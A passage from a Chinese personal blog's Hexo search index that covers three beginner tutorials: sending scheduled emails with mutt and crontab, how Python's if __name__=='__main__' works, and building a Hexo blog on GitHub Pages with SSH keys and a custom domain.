到这里邮箱配置的环境可以了，现在只能只能用命令行发送邮件。如何做到自动发送，且向下see 常见的报错，搜一下一大推解决方案，奔溃边缘就重新配置，从0开始！ mutt的常用命令 mutt [-hnpRvxz][-a&lt;文件&gt;][-b&lt;地址&gt;][-c&lt;地址&gt;][-f&lt;邮件文件&gt;][-F&lt;配置文件&gt;][-H&lt;邮件草稿&gt;][-i&lt;文件&gt;][-m&lt;类型&gt;][-s&lt;主题&gt;][邮件地址] Linux命令参数： -a&lt;文件 在邮件中加上附加文件。 -b&lt;地址 指定密件副本的收信人地址。 -c&lt;地址 指定副本的收信人地址。 -f&lt;邮件文件 指定要载入的邮件文件。 -F&lt;配置文件 指定mutt程序的设置文件，而不读取预设的.muttrc文件。 -h 显示帮助。 -H&lt;邮件草稿&gt;&nbsp; 将指定的邮件草稿送出 -i&lt;文件 将指定文件插入邮件内文中 -m&lt;类型 指定预设的邮件信箱类型。 -n 不要去读取程序培植文件(/etc/Muttrc) -p 在mutt中编辑完邮件后，而不想将邮件立即送出，可将该邮件暂缓寄出。 -R 以只读的方式开启邮件文件 -s&lt;主题 指定邮件的主题。 -v 显示mutt的版本信息以及当初编译此文件时所给予的参数。 -x 模拟mailx的编辑方式。 -z 与-f参数一并使用时，若邮件文件中没有邮件即不启动mutt。 举个橘子： mutt -s &quot;subject&quot; -a /home/admin/backup.tar.gz &lt; /tmp/x.txt -s: 邮件标题，用””括上 -a: 邮件附件。如上命令就是将/backup目录下 backup.tar.gz文件作为附件发送。 &lt; /tmp/x.txt：/tmp目录下x.txt文件里的内容作为邮件内容发送。 给多人发送邮件，只要在邮箱地址后加空格接着输入邮箱地址即可，如： mutt -s &quot;subject&quot; -a /home/admin/backup.tar.gz &lt; /tmp/x.txt 网易163邮箱获取授权码 163免费邮箱可以直接要网页上进行收发邮件，，如果在客户端上收发邮件必须使用授权码才能够使用 授权码163邮箱的一个安全机制 登录163邮箱，在设置里面 查看，应该是没开启的状态，我的开启了 点击开启，手机验证，输入的密码就是上面配置中输入的密码同时开通POP3/SMTP/IMTP邮件收发服务，你的手机邮件都会记录下这个密码的。 在测试的时候出现错误：不要怕，去翻译去百度（我就是这么煎熬的过来的） #3、执行脚本编写 前面的的步骤成在Ubuntu上配置，下面就让发送邮件和定时功能结合起来，编写.sh小脚本 在tmp下创建emil文件夹 测试小实验： 在里面创建a.sh文件，输入 echo &quot;aaaaaaaaaa&quot; | mutt -s &quot;this is title&quot; 1599121712@qq.com 邮箱是要发到的邮箱。 bash &apos;/tmp/email/a.sh&apos; 收到邮件 然后在crontab中定时执行这个脚本 crontab -e 添加定时语句，每一分钟执行一次a.sh的脚本 */1 * * * * bash /tmp/email/a.sh 保存 退出 重启服务器 这是就会每分钟自动发送给你一次邮件 不行我要赶紧关了，这一分钟一次也太烦了！！小实验到此实验成功！ 下面写将python爬取数据的1.txt文本中的内容发送到邮件上的.sh脚本 同样的步骤依旧在原email的目录下创建1.sh和1.txt 编写1.sh内容 echo &quot;this is my computer&quot;|mutt -s &quot;my_conputer server&quot; 1599121712@qq.com &lt;/tmp/email/1.txt -a /tmp/email/1.txt 然后让他定时运行脚本 */30 * * * * bash /tmp/email/1.sh 30分钟给我发送一次，自己可以任意修改时间 保存，重启服务完成.sh脚本的编写 python爬虫程序的编写，将爬取的内容加入的/tmp/email/1.txt文档中 （没有小实验） 实现过程 写好程序同样也放在email的目录下 然后crontab加入定时运行python 总过程结束 效果图]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>定时发送</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分析if__name__==__main__]]></title>
    <url>%2F2017%2F07%2F14%2F%E5%88%86%E6%9E%90if-name-main%2F</url>
    <content type="text"><![CDATA[分析if name ==’ main ‘ 刚开始学习python的时候看到其中的if name ==’ main ‘这个代码，（当时模糊理解为类似于c的主函数）不知道它真正是干嘛的，什么作用？ “Make a script both importable and executable” 最经典的就是这就话意思是 “让你写的脚本模块不仅可以导入到别人的模块中使用，也能自己去执行”。不明白也没关系，下面就来举几个最简单的例子 首先，创建一个a.py的文件 print(&apos;this is my a .py************************&apos;) print(&apos;a.py__name__: %s&apos; %__name__) 这里是先确定在什么都没有的情况下，输出 name 是什么？输出后发现是缺省的 main this is my a .py************************ a.py__name__: __main__ 这就是最基础的:’这句话为什么会执行它下面的内容’,因为’name==main’啊！验证一下： print(&apos;this is my a .py************************&apos;) print(&apos;a.py__name__: %s&apos; %__name__) if __name__==&apos;__main__&apos;: print(&apos;this is a.py--------------&apos;) 同时if条件执行，输出’this is a.py———‘，文件a.py的name为main this is my a .py************************ a.py__name__: __main__ this is a.py-------------- 这时创建另一个b.py文件（先类似于a.py），来弄清两者之间的关系 print(&apos;this is my b.py************************&apos;) print(&apos;b.py__name__:%s&apos; %__name__) if __name__==&apos;__main__&apos;: print(&apos;this is b.py------------&apos;) 毫无疑问他的输出完全和a.py类似，此时在它的头加上import a，再分析其中的变化 import a print(&apos;this is my b. py************************&apos;) print(&apos;b.py__name__: %s&apos; %__name__) if __name__==&apos;__main__&apos;: print(&apos;this is b.py------------&apos;) 输出后： this is my a .py************************ a.py__name__: a this is my b. py************************ b.py__name__: __main__ this is b.py------------ 调用a.py后会生成一个名为“ pycache ”的文件夹，里面pyc文件“a.cpython-35.pyc”，输出同时也发生了变化。 只打印了a.py文件if前面的语句，说明if语句并没有执行，也就是a.py中的name！==main，找下原因，原来b.py的输出–&gt;a.py__ name : a，在之前a.py中输出的a.py name :main 。就可以认定为此时被通过import导入文佳模块 name 的值就是我们这个文件名字而不是 main __；所以它不能执行a.py的if语句，就只能输出a中if前面的语句，b.py的name此时是main，执行了if语句，就打印了“this is b.py”如此类推我们我们再去新建一个c.py，去把带有a模块的模块b.py加入到c.py中应该也是同样的原理。 验证c.py import b print(&apos;this is my c. py************************&apos;) print(&apos;c.py__name__: %s&apos; %__name__) if __name__==&apos;__main__&apos;: print(&apos;this is c.py------------&apos;) 输出c.py this is my a .py************************ a.py__name__: a this is my b. py************************ b.py__name__: b this is my c. py************************ c.py__name__: __main__ this is c.py------------ 异想天开的想法：如果我把a.py文件改名为 main .py会不会就能在b.py调用模块 main .py（改名a.py）的时候就直接能能是if成立呢？（思路：b.py中返回的name就是被调用模块文件的名字） 往往现实是这样的提示“invalid syntax”哈哈！mdzz想想人家怎么会给你留这样的bug呢？失败告终，所以创建名字的时候老老实实的，避开” main.py”的奇葩名 总结：每个python的模块都包含一个默认的变量 main，模块中的name的值取决于如何运用模块。1、当模块a（上面自己创建的py文件）被自身运行的时候，理解为main就是main，if的返回结果为true,执行其下面的条件。2、如果a被调用import到其他的模块b中去，此时a的mian的值就变成了文件名，a模块中if条件返回flase，便不能执行被调用函数a中的if条件下的函数，只执行模块a中if前面的语句和调用它的函数b中的语句，理解为：a模块变残缺，b模块正常运行标准程序 此函数理解为：可以保留一个模块脚本能独立的运行，又能使得该模块脚本的函数能够成为其他模块脚本的拓展，如果给一个模块做测试，不想让它运行的函数将不会被执行]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>main</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用github与Hexo搭建个人博客]]></title>
    <url>%2F2017%2F07%2F09%2F%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[使用github与Hexo搭建个人博客 2017年7月9日 16:19:38 很多人都想自己拥有一个博客，把自己的学习总结心得写在上面，技术类类似的网站“简书”、“博客园”、“CSD博客”都可以使用，但是如果你不想前篇一律的博客格式，那就造起来，拥有一个属于自己的博客，自己的网址。 这篇文章是根据我自己搭建博客的经验来总结，关键是————让想搭建博客的小白……不，小透明也能轻轻松松的搭建成功。 github能创建静态的网站博客。写的文章做成HTML网页传到github，加载会很快，也提供免费的空间和域名。关于使用github与Hexo的用法各大论坛网站都有使用方法，本人觉得他们总结的太麻烦。不如一句一句的教你才是最好的 ，干脆会复制粘贴你就能成功了！ 搭建博客的步骤 环境搭建 创建配置Hexo 配置github库 配置域名 创建第一篇文章 The first：环境搭建 注册Github帐号注册参考详细图解、https://github.com/ 下载、安装git（点击直接下载&lt; Windows版 &gt;） 下载、安装 Node.js官网下载（找到DOWNLOADS、选择你系统的下载）直接下载点击安装就行 创建和配置Hexo： 先在本的目录中创建一个名为Hexo的文件夹，初期配置完成，接下来的事情就交给第二部分完成了 。 The second： 创建配置HexoHexo作为本地博客的根目录在本地的目录里创建Hexo后，类似于我直接创建 在Hexo的目录下右键打开GitBash（或者你按住Shift➕右键&gt;在此处打开命令窗口） 输入或者复制下面的代码 （ 本文中前面有 $ 符号的是在GitBash中打开的。当然你也可以把命名在计算机命令窗口下运行） $ npm install -g hexo $ hexo init 然后空空的Hexo就会有下面的结构 $ hexo generate $ hexo server （hexo server 启动本地的服务……ctrl+c中断服务的开启） 然后打开浏览器，打开http://localhost:4000/如果能打开就说明这一步已经成功了（ps：打开本地地址的时候，hexo server一定要在开启的状态）然后出现了hexo–hello world 相当于你自己本地计算机搭建的网站，这个网站只能你自己看到，所以你要把他和Github连接上传。来达到让被人也能看到的目的。 如果你感觉这个主题很low，可以去改变一下主题 选择你喜欢的炫酷主题下载的部分我喜欢的主题 进入Hexo文件夹下的thems，在这个文件夹下右键GitBash，打开终端 git clone https://github.com/litten/hexo-theme-yilia.git 克隆完成在你的themes中会有一个新的主题包hexo-theme-yilia。 然后打开Hexo下面的_config.yml文件，修改里面的theme–&gt;hexo-theme-yilia 这重新打开服务 hexo s 进入本地地址 http://localhost：4000主题旧改变了，同样的方法也可以下载官网中你喜欢的炫酷的主题。进入上面主题网站下载里面Github的文档 选择喜欢的主题 点击要下载主题的名称，进入Github库 找到绿色按钮，Clone or download，下载压缩包 解压到Hexo–&gt;themes中 修改Hexo下面的_config.yml文件中themes下面的为你下载的主题的名字 The Third：配置Github库在这步的前提你要完成了Github帐号的注册与新建一个库。 打开电脑的开始Git–&gt;Git Bash 检查SSH keys $ cd ~/.ssh 如果第一次在电脑上装此步骤，就显示No such file or directory 是正常的，如果你以前装过，或者装失败过，那就要清除原来的ssh key设置 $ ls config id_rsa id_rsa.pub known_hosts $ mkdir key_backup $ cp id_rsa* key_backup $ rm id_rsa* 再次检查 $ cd ~/.ssh 生成新的SSH key $ ssh-keygen -t rsa -C &quot;你要就收信息的邮箱&quot; Generating public/private rsa key pair. Enter file in which to save the key (/Users/your_user_directory/.ssh/id_rsa):&lt;回车就好&gt; 输入密码（这个密码要记住，最后在你上传文件的时候会使用） Enter passphrase (empty for no passphrase):&lt;输入加密串&gt; Enter same passphrase again:&lt;再次输入加密串&gt; 添加key到Github 在计算机中搜索文件id_rsa.pub，打开文件复制里面的内容 进入你自己Github的主页悬着按钮settings 选择SSH Key选项，title随便写，把内容复制到key中， 点击add添加成功 测试在命令行下面直接是复制ssh -T git@github.com （复制不要该任何东西） $ ssh -T git@github.com 出现，输入：yes Are you sure you want to continue connecting (yes/no)? 提示successfully Hi &lt;em&gt;username&lt;/em&gt;! You&apos;ve successfully authenticated, but GitHub does not provide shell access. 设置账号信息 别傻傻傻傻的复制了 $ git config --global user.name &quot;张三&quot;(你的真实名字) $ git config --global user.email 你的邮箱&quot;（你的邮箱） 上传与发布 进入到Hexo的目录下，用Git Bash执行下面的命令 $ hexo clean $ hexo g $ hexo d 在此过程中会让你输入一次密码，这个密码就是生成SSH keys 键入的密码（不知道是啥的抬头向上看看） 成功的提示是 Edpoly done：git 如果没有出现这句话ERROR Deployer not found: git运行下面这就话 npm install hexo-deployer-git --save 在进行一次 The Forth：绑定域名是这样的此时个人的博客的第一种形式可以使用，就是通过gtihub分配给你的域名访问，形如：xxx.github.io的。 购买域名得到域名后，点击github自己创建的博客仓库create new file here IO/+ 名字命为CNAME，内容为你自己买的域名（格式要严谨www开头，这个地方容易出错） 提交后，仓库里面会有CNAME的文件，然后点击右上角的Download zip将整个仓库压缩包下载，只要里面的CNAME文件，复制到Hexo下的Source的目录下。这样就可以解析了 ps：如果不想花钱买域名，那就直接用人家github分的域名吧！这也是可以的 The fifth：创建第一篇文章在Hexo-&gt;Source-&gt;——post文件夹下面创建你要写的博客 hexo new &quot;文章标题&quot; 他是md类型的文件，使用支持Markdown编译器的的软件打开文件。这样写出来的博客才会好看 同时推荐用Markdown pad，下载地址http://markdownpad.com/download.html 传送豪门–Markdown语法通俗易懂使用https://segmentfault.com/markdown 写完第一篇文章后。可以现在上传到本地预览在网站效果 hexo g hexo s 达到自己的满意程度就可以发布自己的文章 hexo d 第一次上传可能需要密码，如果出现报错 ERROR Deployer not found: git 就执行一次 npm install hexo-deployer-git --save 再试一次 INFO Deploy done: git git上传成功，开启博客之旅–！]]></content>
      <categories>
        <category>Github</category>
      </categories>
      <tags>
        <tag>github</tag>
      </tags>
  </entry>
</search>
